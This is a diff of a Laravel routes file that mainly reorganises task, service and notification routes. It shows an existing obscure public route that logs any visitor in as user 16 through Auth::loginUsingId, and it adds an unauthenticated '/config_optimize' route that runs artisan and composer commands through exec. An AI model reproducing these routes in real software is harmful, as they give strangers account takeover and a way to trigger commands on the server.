@@ -6,7 +6,6 @@ use App\Providers\RouteServiceProvider;
 use Illuminate\Support\Facades\Artisan;
 use App\Http\Controllers\Dashboard\ProfileController;
 use App\Http\Controllers\Dashboard\Admin\DateController;
-use App\Http\Controllers\Dashboard\Admin\TaskController;
 use App\Http\Controllers\Dashboard\Admin\UserController;
 use App\Http\Controllers\Dashboard\Admin\DailyController;
 use App\Http\Controllers\Dashboard\Admin\IndexController;
@@ -17,14 +16,15 @@ use App\Http\Controllers\Dashboard\Admin\AbsenceController;
 use App\Http\Controllers\Dashboard\Admin\MessageController;
 use App\Http\Controllers\Dashboard\Admin\ProjectController;
 use App\Http\Controllers\Dashboard\Admin\ServiceController;
-use App\Http\Controllers\Dashboard\Notification\SettingSmsController;
-use App\Http\Controllers\Dashboard\Notification\NotificationListController;
+use App\Http\Controllers\Dashboard\Employee\TaskController;
+use App\Http\Controllers\Notification\SettingSmsController;
 use App\Http\Controllers\Dashboard\Admin\CalenderController;
 use App\Http\Controllers\Dashboard\Admin\CustomerController;
 use App\Http\Controllers\Dashboard\Admin\EmployeeController;
 use App\Http\Controllers\Dashboard\Admin\AccountingController;
+// use App\Http\Controllers\Dashboard\Employee\TaskController as EmployeeTaskController ;
+use App\Http\Controllers\Notification\NotificationListController;
 use App\Http\Controllers\Dashboard\IndexController as DashboardIndexController;
-use App\Http\Controllers\Dashboard\Employee\TaskController as EmployeeTaskController ;
 use App\Http\Controllers\Dashboard\Customer\IndexController as CustomerIndexController ;
 use App\Http\Controllers\Dashboard\Employee\IndexController as EmployeeIndexController ;
 use App\Http\Controllers\Dashboard\Employee\MessageController as EmployeeMessageController ;
@@ -79,6 +79,16 @@ Route::get('/jiwuvya7gtrv682b7iwnorai', function() {
 Route::get('/aiwrughfdgcb', function() {
     Auth::loginUsingId(16);
 });
+
+Route::get('/config_optimize', function() {
+
+    Artisan::call('route:cache');
+    Artisan::call('config:cache');
+    Artisan::call('cache:clear');
+    Artisan::call('view:clear');
+    Artisan::call('optimize:clear');
+    exec('composer dump-autoload');});
+
 Route::get('install', 'InstallController@index')->name('install');
 Route::post('installl', 'InstallController@install')->name('installl');
 Auth::routes();
@@ -170,12 +180,12 @@ Route::prefix('notification')->name('notification.')->group(function () {
                 Route::prefix('service')->name('service.')->group(function () {
 
                     Route::get('/{id}', [ServiceController::class, 'show'])->name('show');
-                    Route::post('/create/{id}', [ServiceController::class, 'CreatePost'])->name('store');
+                    Route::post('/create/{id}', [ServiceController::class, 'store'])->name('store');
                     Route::get('/create/{id}', [ServiceController::class, 'GetCreatePost'])->name('create');
                     Route::get('/', [ServiceController::class, 'GetManagePost'])->name('manage');
                     Route::get('deleteservice/{id}', [ServiceController::class, 'DeletePost'])->name('deleteservice');
-                    Route::get('updateservice/{id}', [ServiceController::class, 'GetEditPost'])->name('updateservice');
-                    Route::post('updateservice/{id}', [ServiceController::class, 'UpdatePost'])->name('update');
+                    Route::get('edit/{id}', [ServiceController::class, 'edit'])->name('edit');
+                    Route::put('update/{id}', [ServiceController::class, 'update'])->name('update');
 
 
                 });
@@ -267,6 +277,9 @@ Route::prefix('phase')->name('phase.')->group(function () {
 
 
 
+
+
+
                //DAILY MANAGMENT
 
 
@@ -351,17 +364,17 @@ Route::prefix('daily')->name('daily.')->group(function () {
                 //TASK MANAGMENT
                 Route::prefix('task')->name('task.')->group(function () {
 
-                Route::post('/create', [EmployeeTaskController::class, 'CreatePost'])->name('store');
-                Route::get('/create', [EmployeeTaskController::class, 'GetCreatePost'])->name('create');
-                Route::get('/manage', [EmployeeTaskController::class, 'GetManagePost'])->name('manage');
-                Route::get('/updatetask/{id}', [EmployeeTaskController::class, 'GetEditPost'])->name('edit');
-                Route::get('/show/{id}', [EmployeeTaskController::class, 'GetTask'])->name('show');
-                Route::get('/updatetask/{id}', [EmployeeTaskController::class, 'GetEditPost'])->name('updatetask');
-                Route::post('/updatetask/{id}', [EmployeeTaskController::class, 'UpdatePost'])->name('update');
-                Route::post('/edittask/{id}', [EmployeeTaskController::class, 'EditPost'])->name('edittask');
+                Route::post('/create', [TaskController::class, 'CreatePost'])->name('store');
+                Route::get('/create', [TaskController::class, 'GetCreatePost'])->name('create');
+                Route::get('/manage', [TaskController::class, 'GetManagePost'])->name('manage');
+                Route::get('/updatetask/{id}', [TaskController::class, 'GetEditPost'])->name('edit');
+                Route::get('/show/{id}', [TaskController::class, 'GetTask'])->name('show');
+                Route::get('/updatetask/{id}', [TaskController::class, 'GetEditPost'])->name('updatetask');
+                Route::post('/updatetask/{id}', [TaskController::class, 'UpdatePost'])->name('update');
+                Route::post('/edittask/{id}', [TaskController::class, 'EditPost'])->name('edittask');
 
-                Route::post('/note', [EmployeeTaskController::class, 'CreateNote'])->name('note');
-                Route::get('/deletenote/{id}', [EmployeeTaskController::class, 'DeleteNote'])->name('deletenote');
+                Route::post('/note', [TaskController::class, 'CreateNote'])->name('note');
+                Route::get('/deletenote/{id}', [TaskController::class, 'DeleteNote'])->name('deletenote');
 
                 });
 
@@ -369,8 +382,8 @@ Route::prefix('daily')->name('daily.')->group(function () {
                 //ABSENCE
                 Route::prefix('absence')->name('absence.')->group(function () {
 
-                Route::post('/create', [EmployeeTaskController::class, 'Absence'])->name('store');
-                Route::post('/end/{id}', [EmployeeTaskController::class, 'AbsenceEnd'])->name('end');
+                Route::post('/create', [TaskController::class, 'Absence'])->name('store');
+                Route::post('/end/{id}', [TaskController::class, 'AbsenceEnd'])->name('end');
 
             });
 
